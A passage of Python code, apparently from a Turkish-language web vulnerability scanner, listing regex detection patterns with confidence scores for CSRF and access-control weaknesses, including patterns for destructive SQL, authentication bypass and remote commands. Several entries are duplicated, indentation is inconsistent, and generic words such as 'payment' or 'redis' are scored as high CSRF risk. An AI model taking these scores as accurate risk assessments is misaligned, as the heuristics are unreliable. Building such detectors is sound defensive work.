    {"desen": r"escape.*user.*\d+", "guven": 0.87, "aciklama": "Escape user data"},
    {"desen": r"normalize.*user_id.*\d+", "guven": 0.85, "aciklama": "Normalization user"},
    # Advanced Validation Bypass
    {"desen": r"validate.*user_id.*!=.*\d+", "guven": 0.9, "aciklama": "Validation bypass user"},
    {"desen": r"sanitize.*account.*\d+", "guven": 0.85, "aciklama": "Sanitization account"},
    {"desen": r"filter.*id.*\d+", "guven": 0.82, "aciklama": "Filter ID bypass"},
    {"desen": r"escape.*user.*\d+", "guven": 0.87, "aciklama": "Escape user data"},
    {"desen": r"normalize.*user_id.*\d+", "guven": 0.85, "aciklama": "Normalization user"},
                {"desen": r"Unauthorized", "guven": 0.9, "aciklama": "Yetkisiz erişim"}
            ],
            ZafiyetTipi.CSRF: [
                {"desen": r"Cross-Site Request Forgery", "guven": 0.9, "aciklama": "CSRF koruması eksik"},
                {"desen": r"Cross-Site Request Forgery", "guven": 0.9, "aciklama": "CSRF koruması eksik"},
        {"desen": r"csrf_token", "guven": 0.85, "aciklama": "CSRF token eksik"},
        {"desen": r"@csrf_exempt", "guven": 0.95, "aciklama": "Django CSRF koruması devre dışı"},
        {"desen": r"csrf_disable", "guven": 0.9, "aciklama": "CSRF koruması manuel olarak devre dışı"},
        {"desen": r"no-csrf", "guven": 0.88, "aciklama": "CSRF koruması yok"},
        
        # Django Framework CSRF Desenleri
        {"desen": r"{% csrf_token %}", "guven": 0.2, "aciklama": "Django CSRF token mevcut (güvenli)"},
        {"desen": r"csrf_failure", "guven": 0.85, "aciklama": "CSRF doğrulama hatası"},
        {"desen": r"CsrfViewMiddleware", "guven": 0.3, "aciklama": "Django CSRF middleware (güvenli)"},
        {"desen": r"CSRF_COOKIE_NAME", "guven": 0.4, "aciklama": "CSRF cookie ayarı"},
        {"desen": r"CSRF_COOKIE_SECURE", "guven": 0.3, "aciklama": "CSRF cookie güvenlik ayarı"},
        
        # Flask Framework CSRF Desenleri
        {"desen": r"csrf.protect", "guven": 0.3, "aciklama": "Flask CSRF koruması (güvenli)"},
        {"desen": r"CSRFProtect", "guven": 0.3, "aciklama": "Flask CSRF koruma sınıfı"},
        {"desen": r"csrf_token_missing", "guven": 0.9, "aciklama": "Flask CSRF token eksik"},
        {"desen": r"WTF-CSRF", "guven": 0.3, "aciklama": "WTForms CSRF koruması"},
        {"desen": r"validate_csrf_token", "guven": 0.4, "aciklama": "CSRF token doğrulama fonksiyonu"},
        
        # ASP.NET CSRF Desenleri
        {"desen": r"@Html.AntiForgeryToken", "guven": 0.3, "aciklama": "ASP.NET antiforgery token (güvenli)"},
        {"desen": r"ValidateAntiForgeryToken", "guven": 0.3, "aciklama": "ASP.NET CSRF doğrulama"},
        {"desen": r"RequestVerificationToken", "guven": 0.4, "aciklama": "ASP.NET request verification"},
        {"desen": r"__RequestVerificationToken", "guven": 0.4, "aciklama": "ASP.NET hidden CSRF field"},
        {"desen": r"AntiForgeryConfig", "guven": 0.4, "aciklama": "ASP.NET antiforgery yapılandırma"},
        
        # PHP CSRF Desenleri
        {"desen": r"csrf_hash", "guven": 0.4, "aciklama": "PHP CSRF hash kontrolü"},
        {"desen": r"\$_SESSION\['csrf_token'\]", "guven": 0.4, "aciklama": "PHP session CSRF token"},
        {"desen": r"generate_csrf_token", "guven": 0.4, "aciklama": "PHP CSRF token üretimi"},
        {"desen": r"verify_csrf_token", "guven": 0.4, "aciklama": "PHP CSRF token doğrulama"},
        {"desen": r"csrf_protection", "guven": 0.4, "aciklama": "PHP CSRF koruma fonksiyonu"},
        
        # Node.js/Express CSRF Desenleri
        {"desen": r"csurf", "guven": 0.3, "aciklama": "Express CSRF middleware"},
        {"desen": r"csrfToken", "guven": 0.4, "aciklama": "Express CSRF token"},
        {"desen": r"_csrf", "guven": 0.5, "aciklama": "Express CSRF parametresi"},
        {"desen": r"csrf-token", "guven": 0.5, "aciklama": "CSRF token header"},
        {"desen": r"x-csrf-token", "guven": 0.4, "aciklama": "X-CSRF-Token header"},
        
        # Ruby on Rails CSRF Desenleri
        {"desen": r"protect_from_forgery", "guven": 0.3, "aciklama": "Rails CSRF koruması"},
        {"desen": r"skip_before_action :verify_authenticity_token", "guven": 0.95, "aciklama": "Rails CSRF koruması atlanmış"},
        {"desen": r"authenticity_token", "guven": 0.4, "aciklama": "Rails authenticity token"},
        {"desen": r"csrf_meta_tags", "guven": 0.3, "aciklama": "Rails CSRF meta etiketleri"},
        {"desen": r"ActionController::InvalidAuthenticityToken", "guven": 0.8, "aciklama": "Rails CSRF token hatası"},
        
        # Java/Spring CSRF Desenleri
        {"desen": r"@EnableWebSecurity", "guven": 0.3, "aciklama": "Spring Security aktif"},
        {"desen": r"csrf\(\)\.disable\(\)", "guven": 0.95, "aciklama": "Spring CSRF koruması devre dışı"},
        {"desen": r"CsrfToken", "guven": 0.4, "aciklama": "Spring CSRF token sınıfı"},
        {"desen": r"_csrf", "guven": 0.5, "aciklama": "Spring CSRF parametresi"},
        {"desen": r"X-CSRF-TOKEN", "guven": 0.4, "aciklama": "Spring CSRF header"},
        
        # HTTP Header CSRF Desenleri
        {"desen": r"Origin:", "guven": 0.3, "aciklama": "Origin header kontrolü"},
        {"desen": r"Referer:", "guven": 0.3, "aciklama": "Referer header kontrolü"},
        {"desen": r"X-Requested-With", "guven": 0.4, "aciklama": "AJAX request header"},
        {"desen": r"Content-Type: application/json", "guven": 0.2, "aciklama": "JSON content type"},
        {"desen": r"X-CSRFToken", "guven": 0.4, "aciklama": "CSRF token header"},
        
        # JavaScript CSRF Desenleri
        {"desen": r"document\.cookie\.match\(/csrf/", "guven": 0.4, "aciklama": "JS CSRF cookie okuma"},
        {"desen": r"meta\[name=\"csrf-token\"\]", "guven": 0.4, "aciklama": "JS meta CSRF token"},
        {"desen": r"XMLHttpRequest", "guven": 0.6, "aciklama": "Potansiyel AJAX CSRF riski"},
        {"desen": r"fetch\(", "guven": 0.6, "aciklama": "Fetch API CSRF riski"},
        {"desen": r"axios\.defaults\.headers", "guven": 0.4, "aciklama": "Axios default headers"},
        
        # Form Tabanlı CSRF Desenleri
        {"desen": r'<form[^>]*method=["\']POST["\']', "guven": 0.7, "aciklama": "POST form CSRF riski"},
        {"desen": r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']csrf', "guven": 0.3, "aciklama": "Hidden CSRF input"},
        {"desen": r'action=["\'][^"\']*["\']', "guven": 0.5, "aciklama": "Form action kontrolü gerekli"},
        {"desen": r'method=["\']get["\']', "guven": 0.8, "aciklama": "GET method CSRF riski"},
        {"desen": r'enctype=["\']multipart/form-data["\']', "guven": 0.6, "aciklama": "Multipart form CSRF riski"},
        
        # Cookie Tabanlı CSRF Desenleri
        {"desen": r"Set-Cookie.*csrf", "guven": 0.4, "aciklama": "CSRF cookie ayarı"},
        {"desen": r"SameSite=None", "guven": 0.8, "aciklama": "SameSite None CSRF riski"},
        {"desen": r"SameSite=Lax", "guven": 0.3, "aciklama": "SameSite Lax (kısmen güvenli)"},
        {"desen": r"SameSite=Strict", "guven": 0.1, "aciklama": "SameSite Strict (güvenli)"},
        {"desen": r"Secure;.*HttpOnly", "guven": 0.2, "aciklama": "Güvenli cookie ayarları"},
        
        # API Endpoint CSRF Desenleri
        {"desen": r"/api/[^/]*/delete", "guven": 0.8, "aciklama": "Delete API endpoint CSRF riski"},
        {"desen": r"/api/[^/]*/update", "guven": 0.7, "aciklama": "Update API endpoint CSRF riski"},
        {"desen": r"/api/[^/]*/create", "guven": 0.7, "aciklama": "Create API endpoint CSRF riski"},
        {"desen": r"POST /admin/", "guven": 0.9, "aciklama": "Admin POST endpoint yüksek risk"},
        {"desen": r"PUT /api/", "guven": 0.7, "aciklama": "PUT API endpoint CSRF riski"},
        
        # Middleware ve Filter Desenleri
        {"desen": r"@WebFilter", "guven": 0.4, "aciklama": "Java web filter"},
        {"desen": r"doFilter\(", "guven": 0.5, "aciklama": "Java filter implementasyonu"},
        {"desen": r"app\.use\(", "guven": 0.5, "aciklama": "Express middleware"},
        {"desen": r"before_action", "guven": 0.4, "aciklama": "Rails before action"},
        {"desen": r"@PreAuthorize", "guven": 0.3, "aciklama": "Spring PreAuthorize"},
        
        # Güvenlik Bypass Desenleri
        {"desen": r"disable_csrf_protection", "guven": 0.95, "aciklama": "CSRF koruması kapatılmış"},
        {"desen": r"skip_csrf_verification", "guven": 0.9, "aciklama": "CSRF doğrulama atlanmış"},
        {"desen": r"csrf_exempt", "guven": 0.9, "aciklama": "CSRF muafiyeti"},
        {"desen": r"no_csrf_protection", "guven": 0.95, "aciklama": "CSRF koruması yok"},
        {"desen": r"bypass_csrf", "guven": 0.95, "aciklama": "CSRF bypass"},
        
        # Test ve Debug Desenleri
        {"desen": r"debug.*csrf", "guven": 0.6, "aciklama": "CSRF debug modu"},
        {"desen": r"test.*environment.*csrf", "guven": 0.7, "aciklama": "Test ortamında CSRF"},
        {"desen": r"development.*csrf.*false", "guven": 0.8, "aciklama": "Development'ta CSRF kapalı"},
        {"desen": r"if.*debug.*csrf", "guven": 0.7, "aciklama": "Debug modunda CSRF bypass"},
        {"desen": r"localhost.*csrf.*disable", "guven": 0.6, "aciklama": "Localhost CSRF devre dışı"},
        
        # İleri Seviye CSRF Desenleri
        {"desen": r"double-submit-cookie", "guven": 0.3, "aciklama": "Double submit cookie pattern"},
        {"desen": r"synchronizer-token", "guven": 0.3, "aciklama": "Synchronizer token pattern"},
        {"desen": r"origin-validation", "guven": 0.3, "aciklama": "Origin validation"},
        {"desen": r"referer-validation", "guven": 0.4, "aciklama": "Referer validation"},
        {"desen": r"custom-header-validation", "guven": 0.3, "aciklama": "Custom header validation"},
        
        # Framework Özel CSRF Desenleri
        {"desen": r"Laravel.*csrf", "guven": 0.4, "aciklama": "Laravel CSRF koruması"},
        {"desen": r"Symfony.*csrf", "guven": 0.4, "aciklama": "Symfony CSRF koruması"},
        {"desen": r"CodeIgniter.*csrf", "guven": 0.4, "aciklama": "CodeIgniter CSRF"},
        {"desen": r"CakePHP.*csrf", "guven": 0.4, "aciklama": "CakePHP CSRF koruması"},
        {"desen": r"Zend.*csrf", "guven": 0.4, "aciklama": "Zend Framework CSRF"},
        
        # Mobile API CSRF Desenleri
        {"desen": r"mobile.*api.*csrf", "guven": 0.7, "aciklama": "Mobile API CSRF riski"},
        {"desen": r"rest.*api.*csrf", "guven": 0.6, "aciklama": "REST API CSRF riski"},
        {"desen": r"json.*api.*csrf", "guven": 0.6, "aciklama": "JSON API CSRF riski"},
        {"desen": r"graphql.*csrf", "guven": 0.7, "aciklama": "GraphQL CSRF riski"},
        {"desen": r"websocket.*csrf", "guven": 0.8, "aciklama": "WebSocket CSRF riski"},
        
        # CORS ve CSRF İlişkisi
        {"desen": r"Access-Control-Allow-Origin: \*", "guven": 0.8, "aciklama": "Wildcard CORS CSRF riski"},
        {"desen": r"Access-Control-Allow-Credentials: true", "guven": 0.6, "aciklama": "CORS credentials CSRF riski"},
        {"desen": r"cors.*credentials.*true", "guven": 0.6, "aciklama": "CORS credentials aktif"},
        {"desen": r"withCredentials.*true", "guven": 0.6, "aciklama": "XHR credentials CSRF riski"},
        {"desen": r"credentials.*include", "guven": 0.6, "aciklama": "Fetch credentials CSRF riski"},
        
        # Özel Header Kontrolleri
        {"desen": r"X-Forwarded-For", "guven": 0.4, "aciklama": "IP forwarding header"},
        {"desen": r"X-Real-IP", "guven": 0.4, "aciklama": "Real IP header"},
        {"desen": r"User-Agent", "guven": 0.5, "aciklama": "User Agent header kontrolü"},
        {"desen": r"X-Custom-Header", "guven": 0.3, "aciklama": "Custom header CSRF koruması"},
        {"desen": r"Authorization: Bearer", "guven": 0.2, "aciklama": "Bearer token (JWT güvenli)"},
        
        # Hata Mesajları ve Loglar
        {"desen": r"CSRF.*token.*mismatch", "guven": 0.8, "aciklama": "CSRF token uyumsuzluğu"},
        {"desen": r"CSRF.*validation.*failed", "guven": 0.8, "aciklama": "CSRF doğrulama başarısız"},
        {"desen": r"Invalid.*CSRF.*token", "guven": 0.8, "aciklama": "Geçersiz CSRF token"},
        {"desen": r"CSRF.*attack.*detected", "guven": 0.9, "aciklama": "CSRF saldırı tespit edildi"},
        {"desen": r"Forbidden.*CSRF", "guven": 0.8, "aciklama": "CSRF nedeniyle erişim engellendi"},
        
        # Configuration Dosyası Desenleri
        {"desen": r"csrf.*enabled.*false", "guven": 0.95, "aciklama": "Config'de CSRF kapalı"},
        {"desen": r"enable_csrf_protection.*0", "guven": 0.9, "aciklama": "CSRF koruması 0"},
        {"desen": r"csrf_protection.*off", "guven": 0.9, "aciklama": "CSRF koruması off"},
        {"desen": r"CSRF_ENABLED.*False", "guven": 0.95, "aciklama": "CSRF_ENABLED False"},
        {"desen": r"csrf.*check.*disabled", "guven": 0.9, "aciklama": "CSRF check disabled"},
        
        # Framework Routing Desenleri
        {"desen": r"@Route.*POST", "guven": 0.6, "aciklama": "POST route CSRF riski"},
        {"desen": r"@RequestMapping.*POST", "guven": 0.6, "aciklama": "Spring POST mapping"},
        {"desen": r"app\.post\(", "guven": 0.6, "aciklama": "Express POST route"},
        {"desen": r"router\.post\(", "guven": 0.6, "aciklama": "Router POST route"},
        {"desen": r"Route::post\(", "guven": 0.6, "aciklama": "Laravel POST route"},
        
        # Database İşlem Desenleri
        {"desen": r"INSERT.*INTO.*users", "guven": 0.7, "aciklama": "User ekleme CSRF riski"},
        {"desen": r"UPDATE.*users.*SET", "guven": 0.7, "aciklama": "User güncelleme CSRF riski"},
        {"desen": r"DELETE.*FROM.*users", "guven": 0.8, "aciklama": "User silme CSRF riski"},
        {"desen": r"DROP.*TABLE", "guven": 0.9, "aciklama": "Kritik tablo silme riski"},
        {"desen": r"TRUNCATE.*TABLE", "guven": 0.9, "aciklama": "Tablo boşaltma riski"},
        
        # Session Management Desenleri
        {"desen": r"session_destroy", "guven": 0.7, "aciklama": "Session destroy CSRF riski"},
        {"desen": r"logout", "guven": 0.6, "aciklama": "Logout CSRF riski"},
        {"desen": r"session_regenerate_id", "guven": 0.4, "aciklama": "Session ID regeneration"},
        {"desen": r"setcookie", "guven": 0.5, "aciklama": "Cookie setting"},
        {"desen": r"session_start", "guven": 0.3, "aciklama": "Session başlatma"},
        
        # Dosya Upload Desenleri
        {"desen": r"file_upload", "guven": 0.8, "aciklama": "File upload CSRF riski"},
        {"desen": r"multipart/form-data", "guven": 0.7, "aciklama": "Multipart form CSRF riski"},
        {"desen": r"move_uploaded_file", "guven": 0.8, "aciklama": "PHP file upload"},
        {"desen": r"@PostMapping.*multipart", "guven": 0.7, "aciklama": "Spring multipart upload"},
        {"desen": r"multer", "guven": 0.7, "aciklama": "Express file upload middleware"},
        
        # Email ve Notification Desenleri
        {"desen": r"send_email", "guven": 0.6, "aciklama": "Email gönderme CSRF riski"},
        {"desen": r"mail\(", "guven": 0.6, "aciklama": "Mail fonksiyonu CSRF riski"},
        {"desen": r"notification", "guven": 0.5, "aciklama": "Notification CSRF riski"},
        {"desen": r"push_notification", "guven": 0.6, "aciklama": "Push notification riski"},
        {"desen": r"sms_send", "guven": 0.6, "aciklama": "SMS gönderme riski"},
        
        # Payment ve Financial Desenleri
        {"desen": r"payment", "guven": 0.9, "aciklama": "Payment işlemi CSRF riski"},
        {"desen": r"transfer", "guven": 0.9, "aciklama": "Transfer işlemi CSRF riski"},
        {"desen": r"withdraw", "guven": 0.95, "aciklama": "Para çekme CSRF riski"},
        {"desen": r"deposit", "guven": 0.8, "aciklama": "Para yatırma CSRF riski"},
        {"desen": r"purchase", "guven": 0.8, "aciklama": "Satın alma CSRF riski"},
        
        # Admin Panel Desenleri
        {"desen": r"/admin/.*delete", "guven": 0.95, "aciklama": "Admin delete CSRF riski"},
        {"desen": r"/admin/.*create", "guven": 0.8, "aciklama": "Admin create CSRF riski"},
        {"desen": r"/admin/.*modify", "guven": 0.8, "aciklama": "Admin modify CSRF riski"},
        {"desen": r"admin_action", "guven": 0.8, "aciklama": "Admin action CSRF riski"},
        {"desen": r"superuser", "guven": 0.9, "aciklama": "Superuser işlemi CSRF riski"},
        
        # User Management Desenleri
        {"desen": r"change_password", "guven": 0.8, "aciklama": "Password change CSRF riski"},
        {"desen": r"reset_password", "guven": 0.7, "aciklama": "Password reset CSRF riski"},
        {"desen": r"update_profile", "guven": 0.6, "aciklama": "Profile update CSRF riski"},
        {"desen": r"delete_account", "guven": 0.9, "aciklama": "Account delete CSRF riski"},
        {"desen": r"user_registration", "guven": 0.7, "aciklama": "User registration CSRF riski"},
        
        # Social Media Integration Desenleri
        {"desen": r"post_status", "guven": 0.7, "aciklama": "Social post CSRF riski"},
        {"desen": r"share_content", "guven": 0.6, "aciklama": "Content sharing CSRF riski"},
        {"desen": r"follow_user", "guven": 0.6, "aciklama": "Follow action CSRF riski"},
        {"desen": r"like_post", "guven": 0.5, "aciklama": "Like action CSRF riski"},
        {"desen": r"comment_post", "guven": 0.6, "aciklama": "Comment CSRF riski"},
        
        # API Security Desenleri
        {"desen": r"api_key", "guven": 0.3, "aciklama": "API key kullanımı"},
        {"desen": r"bearer_token", "guven": 0.2, "aciklama": "Bearer token kullanımı"},
        {"desen": r"oauth", "guven": 0.2, "aciklama": "OAuth kullanımı"},
        {"desen": r"jwt", "guven": 0.2, "aciklama": "JWT token kullanımı"},
        {"desen": r"api_secret", "guven": 0.3, "aciklama": "API secret kullanımı"},
        
        # WebSocket ve Real-time Desenleri
        {"desen": r"socket\.emit", "guven": 0.7, "aciklama": "Socket emit CSRF riski"},
        {"desen": r"websocket", "guven": 0.7, "aciklama": "WebSocket CSRF riski"},
        {"desen": r"real_time", "guven": 0.6, "aciklama": "Real-time işlem riski"},
        {"desen": r"server_sent_events", "guven": 0.5, "aciklama": "SSE CSRF riski"},
        {"desen": r"long_polling", "guven": 0.6, "aciklama": "Long polling riski"},
        
        # Cache ve Session Desenleri
        {"desen": r"cache_clear", "guven": 0.6, "aciklama": "Cache clear CSRF riski"},
        {"desen": r"redis", "guven": 0.4, "aciklama": "Redis cache işlemi"},
        {"desen": r"memcached", "guven": 0.4, "aciklama": "Memcached işlemi"},
        {"desen": r"session_cache", "guven": 0.4, "aciklama": "Session cache"},
        {"desen": r"cache_invalidate", "guven": 0.6, "aciklama": "Cache invalidation"},
        
        # Logging ve Monitoring Desenleri
        {"desen": r"log_action", "guven": 0.5, "aciklama": "Action logging"},
        {"desen": r"audit_log", "guven": 0.4, "aciklama": "Audit logging"},
        {"desen": r"security_log", "guven": 0.4, "aciklama": "Security logging"},
        {"desen": r"error_log", "guven": 0.3, "aciklama": "Error logging"},
        {"desen": r"access_log", "guven": 0.3, "aciklama": "Access logging"},
        
        # Content Management Desenleri
        {"desen": r"create_post", "guven": 0.7, "aciklama": "Post creation CSRF riski"},
        {"desen": r"edit_post", "guven": 0.7, "aciklama": "Post editing CSRF riski"},
        {"desen": r"delete_post", "guven": 0.8, "aciklama": "Post deletion CSRF riski"},
        {"desen": r"publish_post", "guven": 0.7, "aciklama": "Post publishing CSRF riski"},
        {"desen": r"moderate_content", "guven": 0.8, "aciklama": "Content moderation CSRF riski"},
        
        # System Configuration Desenleri
        {"desen": r"system_config", "guven": 0.9, "aciklama": "System config CSRF riski"},
        {"desen": r"server_restart", "guven": 0.95, "aciklama": "Server restart CSRF riski"},
        {"desen": r"database_backup", "guven": 0.8, "aciklama": "DB backup CSRF riski"},
        {"desen": r"system_update", "guven": 0.9, "aciklama": "System update CSRF riski"},
        {"desen": r"maintenance_mode", "guven": 0.8, "aciklama": "Maintenance mode CSRF riski"},
        
        # E-commerce Desenleri
        {"desen": r"add_to_cart", "guven": 0.6, "aciklama": "Add to cart CSRF riski"},
        {"desen": r"checkout", "guven": 0.9, "aciklama": "Checkout CSRF riski"},
        {"desen": r"place_order", "guven": 0.9, "aciklama": "Place order CSRF riski"},
        {"desen": r"cancel_order", "guven": 0.8, "aciklama": "Cancel order CSRF riski"},
        {"desen": r"refund", "guven": 0.9, "aciklama": "Refund CSRF riski"},
        
        # File Management Desenleri
        {"desen": r"file_delete", "guven": 0.8, "aciklama": "File delete CSRF riski"},
        {"desen": r"file_rename", "guven": 0.7, "aciklama": "File rename CSRF riski"},
        {"desen": r"file_move", "guven": 0.7, "aciklama": "File move CSRF riski"},
        {"desen": r"directory_create", "guven": 0.7, "aciklama": "Directory create CSRF riski"},
        {"desen": r"file_permissions", "guven": 0.8, "aciklama": "File permissions CSRF riski"},
        
        # Authentication Bypass Desenleri
        {"desen": r"auth_bypass", "guven": 0.95, "aciklama": "Authentication bypass"},
        {"desen": r"login_bypass", "guven": 0.95, "aciklama": "Login bypass CSRF riski"},
        {"desen": r"permission_bypass", "guven": 0.95, "aciklama": "Permission bypass"},
        {"desen": r"role_bypass", "guven": 0.95, "aciklama": "Role bypass CSRF riski"},
        {"desen": r"access_control_bypass", "guven": 0.95, "aciklama": "Access control bypass"},
        
        # Database Schema Desenleri
        {"desen": r"ALTER TABLE", "guven": 0.9, "aciklama": "Table alteration CSRF riski"},
        {"desen": r"CREATE INDEX", "guven": 0.7, "aciklama": "Index creation CSRF riski"},
        {"desen": r"DROP INDEX", "guven": 0.8, "aciklama": "Index deletion CSRF riski"},
        {"desen": r"CREATE VIEW", "guven": 0.7, "aciklama": "View creation CSRF riski"},
        {"desen": r"DROP VIEW", "guven": 0.8, "aciklama": "View deletion CSRF riski"},
        
        # Mobile App API Desenleri
        {"desen": r"mobile.*login", "guven": 0.7, "aciklama": "Mobile login CSRF riski"},
        {"desen": r"app.*api.*post", "guven": 0.6, "aciklama": "Mobile app POST API"},
        {"desen": r"device.*registration", "guven": 0.7, "aciklama": "Device registration CSRF riski"},
        {"desen": r"push.*token.*update", "guven": 0.6, "aciklama": "Push token update"},
        {"desen": r"location.*update", "guven": 0.6, "aciklama": "Location update CSRF riski"},
        
        # Microservices Desenleri
        {"desen": r"service.*to.*service", "guven": 0.5, "aciklama": "Service-to-service call"},
        {"desen": r"internal.*api", "guven": 0.4, "aciklama": "Internal API call"},
        {"desen": r"microservice.*endpoint", "guven": 0.5, "aciklama": "Microservice endpoint"},
        {"desen": r"service.*mesh", "guven": 0.3, "aciklama": "Service mesh güvenlik"},
        {"desen": r"api.*gateway", "guven": 0.4, "aciklama": "API Gateway routing"},
        
        # Docker ve Container Desenleri
        {"desen": r"docker.*exec", "guven": 0.8, "aciklama": "Docker exec CSRF riski"},
        {"desen": r"container.*restart", "guven": 0.8, "aciklama": "Container restart"},
        {"desen": r"kubernetes.*apply", "guven": 0.8, "aciklama": "K8s apply CSRF riski"},
        {"desen": r"helm.*install", "guven": 0.8, "aciklama": "Helm install CSRF riski"},
        {"desen": r"pod.*delete", "guven": 0.9, "aciklama": "Pod deletion CSRF riski"},
        
        # Cloud Service Desenleri
        {"desen": r"aws.*s3.*delete", "guven": 0.9, "aciklama": "S3 delete CSRF riski"},
        {"desen": r"azure.*blob.*upload", "guven": 0.7, "aciklama": "Azure blob upload"},
        {"desen": r"gcp.*storage.*write", "guven": 0.7, "aciklama": "GCP storage write"},
        {"desen": r"lambda.*invoke", "guven": 0.7, "aciklama": "Lambda invoke CSRF riski"},
        {"desen": r"ec2.*terminate", "guven": 0.95, "aciklama": "EC2 terminate CSRF riski"},
        
        # Blockchain ve Crypto Desenleri
        {"desen": r"wallet.*transfer", "guven": 0.95, "aciklama": "Crypto transfer CSRF riski"},
        {"desen": r"smart.*contract.*call", "guven": 0.8, "aciklama": "Smart contract CSRF riski"},
        {"desen": r"blockchain.*transaction", "guven": 0.9, "aciklama": "Blockchain tx CSRF riski"},
        {"desen": r"crypto.*withdraw", "guven": 0.95, "aciklama": "Crypto withdraw CSRF riski"},
        {"desen": r"nft.*mint", "guven": 0.8, "aciklama": "NFT mint CSRF riski"},
        
        # IoT ve Device Desenleri
        {"desen": r"device.*control", "guven": 0.8, "aciklama": "Device control CSRF riski"},
        {"desen": r"sensor.*update", "guven": 0.6, "aciklama": "Sensor update"},
        {"desen": r"firmware.*update", "guven": 0.9, "aciklama": "Firmware update CSRF riski"},
        {"desen": r"remote.*command", "guven": 0.9, "aciklama": "Remote command CSRF riski"},
        {"desen": r"iot.*endpoint", "guven": 0.7, "aciklama": "IoT endpoint CSRF riski"},
        
        # Gaming ve Entertainment Desenleri
        {"desen": r"game.*action", "guven": 0.6, "aciklama": "Game action CSRF riski"},
        {"desen": r"score.*update", "guven": 0.7, "aciklama": "Score update CSRF riski"},
        {"desen": r"leaderboard.*modify", "guven": 0.8, "aciklama": "Leaderboard modify"},
        {"desen": r"in.*game.*purchase", "guven": 0.9, "aciklama": "In-game purchase CSRF riski"},
        {"desen": r"achievement.*unlock", "guven": 0.6, "aciklama": "Achievement unlock"},
        
        # Machine Learning Desenleri
        {"desen": r"model.*train", "guven": 0.8, "aciklama": "ML model training"},
        {"desen": r"dataset.*upload", "guven": 0.8, "aciklama": "Dataset upload CSRF riski"},
        {"desen": r"prediction.*api", "guven": 0.6, "aciklama": "Prediction API"},
        {"desen": r"ml.*pipeline", "guven": 0.7, "aciklama": "ML pipeline CSRF riski"},
        {"desen": r"model.*deploy", "guven": 0.8, "aciklama": "Model deployment"},
        
        # Compliance ve Audit Desenleri
        {"desen": r"gdpr.*delete", "guven": 0.8, "aciklama": "GDPR deletion CSRF riski"},
        {"desen": r"data.*export", "guven": 0.7, "aciklama": "Data export CSRF riski"},
        {"desen": r"compliance.*report", "guven": 0.6, "aciklama": "Compliance report"},
        {"desen": r"audit.*trail", "guven": 0.4, "aciklama": "Audit trail"},
        {"desen": r"privacy.*settings", "guven": 0.7, "aciklama": "Privacy settings CSRF riski"},
        
        # Network ve Infrastructure Desenleri
        {"desen": r"firewall.*rule", "guven": 0.9, "aciklama": "Firewall rule CSRF riski"},
        {"desen": r"load.*balancer.*config", "guven": 0.8, "aciklama": "Load balancer config"},
        {"desen": r"dns.*record.*update", "guven": 0.8, "aciklama": "DNS update CSRF riski"},
        {"desen": r"ssl.*certificate.*install", "guven": 0.8, "aciklama": "SSL cert install"},
        {"desen": r"network.*interface.*config", "guven": 0.9, "aciklama": "Network config CSRF riski"},
        
        # Advanced Authentication Desenleri
        {"desen": r"mfa.*disable", "guven": 0.95, "aciklama": "MFA disable CSRF riski"},
        {"desen": r"two.*factor.*bypass", "guven": 0.95, "aciklama": "2FA bypass CSRF riski"},
        {"desen": r"biometric.*disable", "guven": 0.9, "aciklama": "Biometric disable"},
        {"desen": r"sso.*config", "guven": 0.8, "aciklama": "SSO config CSRF riski"},
        {"desen": r"saml.*assertion", "guven": 0.7, "aciklama": "SAML assertion"},
        
        # CI/CD Pipeline Desenleri
        {"desen": r"deploy.*to.*production", "guven": 0.9, "aciklama": "Production deploy CSRF riski"},
        {"desen": r"build.*trigger", "guven": 0.7, "aciklama": "Build trigger CSRF riski"},
        {"desen": r"pipeline.*execute", "guven": 0.8, "aciklama": "Pipeline execute"},
        {"desen": r"rollback.*deployment", "guven": 0.8, "aciklama": "Rollback deployment"},
        {"desen": r"environment.*promote", "guven": 0.8, "aciklama": "Environment promotion"},
        
        # Security Tools Desenleri
        {"desen": r"vulnerability.*scan", "guven": 0.6, "aciklama": "Vuln scan trigger"},
        {"desen": r"penetration.*test", "guven": 0.7, "aciklama": "Pentest trigger"},
        {"desen": r"security.*scan.*start", "guven": 0.6, "aciklama": "Security scan start"},
        {"desen": r"malware.*scan", "guven": 0.6, "aciklama": "Malware scan trigger"},
        {"desen": r"intrusion.*detection", "guven": 0.5, "aciklama": "IDS configuration"},
        
        # Content Delivery Desenleri
        {"desen": r"cdn.*purge", "guven": 0.7, "aciklama": "CDN cache purge CSRF riski"},
        {"desen": r"cache.*invalidate.*all", "guven": 0.8, "aciklama": "Global cache invalidate"},
        {"desen": r"content.*distribution", "guven": 0.6, "aciklama": "Content distribution"},
        {"desen": r"edge.*server.*config", "guven": 0.7, "aciklama": "Edge server config"},
        {"desen": r"bandwidth.*limit", "guven": 0.7, "aciklama": "Bandwidth limit config"},
        
        # Real-time Communication Desenleri
        {"desen": r"video.*call.*start", "guven": 0.6, "aciklama": "Video call CSRF riski"},
        {"desen": r"voice.*call.*initiate", "guven": 0.6, "aciklama": "Voice call CSRF riski"},
        {"desen": r"screen.*share", "guven": 0.7, "aciklama": "Screen share CSRF riski"},
        {"desen": r"chat.*message.*send", "guven": 0.5, "aciklama": "Chat message CSRF riski"},
        {"desen": r"webrtc.*connection", "guven": 0.6, "aciklama": "WebRTC connection"},
        
        # Analytics ve Tracking Desenleri
        {"desen": r"analytics.*event", "guven": 0.4, "aciklama": "Analytics event"},
        {"desen": r"tracking.*pixel", "guven": 0.3, "aciklama": "Tracking pixel"},
        {"desen": r"user.*behavior.*log", "guven": 0.4, "aciklama": "User behavior logging"},
        {"desen": r"conversion.*tracking", "guven": 0.5, "aciklama": "Conversion tracking"},
        {"desen": r"funnel.*analysis", "guven": 0.4, "aciklama": "Funnel analysis"},
        
        # License ve Subscription Desenleri
        {"desen": r"license.*activate", "guven": 0.7, "aciklama": "License activation CSRF riski"},
        {"desen": r"subscription.*cancel", "guven": 0.8, "aciklama": "Subscription cancel CSRF riski"},
        {"desen": r"subscription.*upgrade", "guven": 0.8, "aciklama": "Subscription upgrade"},
        {"desen": r"trial.*extend", "guven": 0.7, "aciklama": "Trial extension CSRF riski"},
        {"desen": r"billing.*update", "guven": 0.8, "aciklama": "Billing update CSRF riski"},
        
        # Backup ve Recovery Desenleri
        {"desen": r"backup.*create", "guven": 0.6, "aciklama": "Backup creation"},
        {"desen": r"backup.*restore", "guven": 0.9, "aciklama": "Backup restore CSRF riski"},
        {"desen": r"disaster.*recovery", "guven": 0.9, "aciklama": "Disaster recovery"},
        {"desen": r"snapshot.*create", "guven": 0.7, "aciklama": "Snapshot creation"},
